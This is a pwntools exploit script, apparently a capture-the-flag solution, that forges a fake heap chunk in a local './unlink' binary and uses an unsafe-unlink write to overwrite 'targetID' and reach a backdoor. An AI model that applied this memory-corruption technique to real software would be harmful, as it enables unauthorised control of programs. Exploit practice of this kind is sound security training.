#!/usr/bin/python3
from pwn import *

context.log_level = 'DEBUG'

conn = process("./unlink")
elf = ELF("./unlink")
targetID_addr = elf.symbols["targetID"]
array_addr = elf.symbols["array"]

def add_ddl(_time, _content):
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'1')
    conn.sendafter(b'ddl time\n', _time.encode())
    conn.sendafter(b'ddl content\n', _content.encode())

def finish_ddl(idx):
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'2')
    conn.sendlineafter(b'ddl index', str(idx).encode())

def show_ddl(idx):
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'3')
    conn.sendlineafter(b"index\n", str(idx).encode())
    conn.recvuntil(b'ddl time: ')
    _time = conn.recvuntil(b'\nddl content: ', drop=True)
    _content = conn.recvuntil(b'\ndone', drop=True)
    return _time, _content

def edit_ddl(idx, _time, _content):
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'4')
    conn.sendlineafter(b'ddl index\n', str(idx).encode())
    conn.sendafter(b'ddl time\n', _time)
    conn.sendlineafter(b'ddl content\n', _content)

def exit_ddl():
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'5')

def check_ddl():
    conn.recvuntil(b'Your chocie:\n')
    conn.sendline(b'6')

print(hex(array_addr))
add_ddl("AAAA\n","BBBB\n")
add_ddl("CCCC\n","DDDD\n")
add_ddl("EEEE\n","FFFF\n")
#construct fake chunk
payload1 = p64(0)+p64(0x5f1)+p64(array_addr-24)+p64(array_addr-16)
payload2 = b"\x00"*0x5d0 + p64(0x5f0)
edit_ddl("1", payload1, payload2)
finish_ddl("2")#unlink, change array[0] to array_addr-24
#set fake_chunk to targetID_addr
payload3=b"\x00"*24+p64(targetID_addr)
edit_ddl("1",payload3,b"\x00")
#change targetID to '\x11'
conn.recvuntil(b'Your chocie:\n')
conn.sendline(b'4')
conn.sendlineafter(b'ddl index', b"1")
conn.sendlineafter(b'ddl time\n',b'\x11')
conn.sendlineafter(b'ddl content\n',b'\x01')
#Remalloc and corrupt to backdoor.
check_ddl()
conn.interactive()

